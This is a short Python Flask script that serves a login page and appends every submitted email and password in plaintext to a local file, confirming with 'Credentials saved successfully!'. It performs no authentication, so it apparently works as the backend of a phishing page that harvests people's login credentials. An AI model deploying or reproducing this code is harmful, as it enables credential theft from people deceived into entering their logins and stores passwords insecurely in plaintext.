from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with open('credentials.txt', 'a') as f:
            f.write(f'Email: {email}, Password: {password}\n')
        return 'Credentials saved successfully!'
    return render_template('index.html')

if __name__ == '__main__':
    app.run()

 